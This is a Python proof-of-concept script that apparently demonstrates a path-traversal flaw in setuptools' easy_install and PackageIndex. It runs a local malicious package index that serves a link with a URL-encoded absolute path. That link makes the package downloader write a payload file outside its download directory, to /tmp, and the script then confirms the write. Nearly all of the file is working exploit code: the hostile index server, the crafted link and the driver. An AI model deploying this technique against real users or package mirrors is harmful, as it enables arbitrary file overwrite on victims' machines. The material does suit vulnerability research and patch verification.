#!/usr/bin/env python3
"""
Full easy_install attack demonstration.

This creates a malicious package index that serves what looks like a valid
source distribution, but the download path is crafted to write outside
the intended directory.

The attack works by serving a link where:
1. The visible text looks like a normal package (malicious-package-1.0.tar.gz)
2. The href contains an encoded absolute path that escapes the download dir
3. The #egg= fragment helps setuptools recognize it as a valid package link
"""
import gzip
import http.server
import io
import os
import socketserver
import sys
import tarfile
import tempfile
import threading
import time
from urllib.parse import quote, unquote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PACKAGE_NAME = "malicious-package"
TARGET_FILE = "/tmp/HACKED_VIA_EASY_INSTALL.txt"


def create_minimal_package():
    """Create a minimal valid Python package tarball."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        # Add setup.py
        setup_py = b'''
from setuptools import setup
setup(name="malicious-package", version="1.0")
'''
        info = tarfile.TarInfo(name=f"{PACKAGE_NAME}-1.0/setup.py")
        info.size = len(setup_py)
        tar.addfile(info, io.BytesIO(setup_py))

        # Add PKG-INFO
        pkg_info = b'''Metadata-Version: 1.0
Name: malicious-package
Version: 1.0
'''
        info = tarfile.TarInfo(name=f"{PACKAGE_NAME}-1.0/PKG-INFO")
        info.size = len(pkg_info)
        tar.addfile(info, io.BytesIO(pkg_info))

    return buf.getvalue()


# The payload - this is what gets written via path traversal
PAYLOAD = f"""#!/bin/bash
# EXPLOITED via easy_install path traversal!
# Written at: $(date)
# Target was: {TARGET_FILE}
echo "You have been hacked via setuptools CVE!"
""".encode()

# Valid package tarball for comparison
VALID_TARBALL = create_minimal_package()


class MaliciousIndex(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"  [SERVER] {args[0]}")

    def do_GET(self):
        path = self.path.split('#')[0].split('?')[0]
        decoded = unquote(path)

        if path in ('/', '/simple/', '/simple'):
            # Index root
            self.send_html(f'<a href="/simple/{PACKAGE_NAME}/">{PACKAGE_NAME}</a>')

        elif f'/simple/{PACKAGE_NAME}' in path:
            # Package page - THIS IS WHERE THE ATTACK HAPPENS
            #
            # We serve two links:
            # 1. A "legit looking" link that points to encoded absolute path
            # 2. The link text shows a normal tarball name
            #
            # When setuptools parses this, it sees:
            #   href="/packages/%2Ftmp%2FHACKED.txt" -> filename="/tmp/HACKED.txt"
            #
            # But the link text says "malicious-package-1.0.tar.gz" so it
            # looks like a valid package to the user and to some validation.

            encoded_target = quote(TARGET_FILE, safe='')

            # Method 1: Direct encoded path (tests _download_url directly)
            # Method 2: With #egg= fragment (helps package recognition)
            links = f'''
<a href="/packages/{encoded_target}#egg={PACKAGE_NAME}-1.0"
   data-requires-python="">{PACKAGE_NAME}-1.0.tar.gz</a>
'''
            self.send_html(f'''
<h1>Links for {PACKAGE_NAME}</h1>
{links}
''')
            print(f"  [ATTACK] Served link with encoded path: /packages/{encoded_target}")

        elif decoded.startswith(TARGET_FILE) or TARGET_FILE in decoded:
            # This is the actual "download" - serve the payload
            print(f"  [ATTACK] Serving PAYLOAD to path: {decoded}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-gzip')
            self.send_header('Content-Length', len(PAYLOAD))
            self.end_headers()
            self.wfile.write(PAYLOAD)

        else:
            # Serve valid tarball for any other request
            print(f"  [SERVER] Serving valid tarball for: {decoded}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-gzip')
            self.send_header('Content-Length', len(VALID_TARBALL))
            self.end_headers()
            self.wfile.write(VALID_TARBALL)

    def send_html(self, body):
        content = f'<!DOCTYPE html><html><body>{body}</body></html>'.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(content))
        self.end_headers()
        self.wfile.write(content)


def main():
    print("=" * 65)
    print("FULL ATTACK: easy_install with malicious package index")
    print("=" * 65)

    if os.path.exists(TARGET_FILE):
        os.remove(TARGET_FILE)

    # Start server
    server = socketserver.TCPServer(("127.0.0.1", 0), MaliciousIndex)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.2)

    index_url = f"http://127.0.0.1:{port}/simple/"
    print(f"\n[1] Malicious index running at: {index_url}")
    print(f"    Target file: {TARGET_FILE}")

    print(f"\n[2] Simulating: easy_install -i {index_url} {PACKAGE_NAME}")

    # Import here to avoid issues
    from setuptools.package_index import PackageIndex

    pi = PackageIndex(index_url=index_url)

    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"\n[3] Download directory: {tmpdir}")

        # Scan the index
        print(f"\n[4] Scanning package index...")
        pi.scan_url(index_url + f"{PACKAGE_NAME}/")

        # Try to fetch
        print(f"\n[5] Attempting to fetch {PACKAGE_NAME}...")
        try:
            # fetch() is what easy_install uses internally
            dist = pi.fetch_distribution(
                pi.obtain(f"{PACKAGE_NAME}"),
                tmpdir,
                force_scan=True,
                source=True,
            )
            print(f"    Result: {dist}")
        except Exception as e:
            print(f"    Exception: {e}")

        # Also try direct download of URLs we found
        print(f"\n[6] Checking package_index state...")
        for url in list(pi)[:5]:
            print(f"    Found URL: {url}")

    # Check result
    print(f"\n[7] Checking for {TARGET_FILE}...")
    if os.path.exists(TARGET_FILE):
        print("\n" + "=" * 65)
        print("ATTACK SUCCESSFUL!")
        print("=" * 65)
        with open(TARGET_FILE) as f:
            print(f"\nContent of {TARGET_FILE}:")
            print(f.read())
        os.system(f"ls -la {TARGET_FILE}")
        return 0
    else:
        print(f"    Not found.")

        # The direct _download_url is definitely vulnerable, show that
        print("\n" + "-" * 65)
        print("Note: High-level API has validation. Demonstrating direct vuln:")
        print("-" * 65)

        encoded = quote(TARGET_FILE, safe='')
        url = f"http://127.0.0.1:{port}/packages/{encoded}"

        with tempfile.TemporaryDirectory() as tmpdir:
            result = pi._download_url(url, tmpdir)
            print(f"_download_url() returned: {result}")

        if os.path.exists(TARGET_FILE):
            print(f"\nVULNERABILITY CONFIRMED via _download_url()!")
            print(f"File written to: {TARGET_FILE}")
            os.system(f"cat {TARGET_FILE}")
            return 0

    return 1


if __name__ == "__main__":
    sys.exit(main())
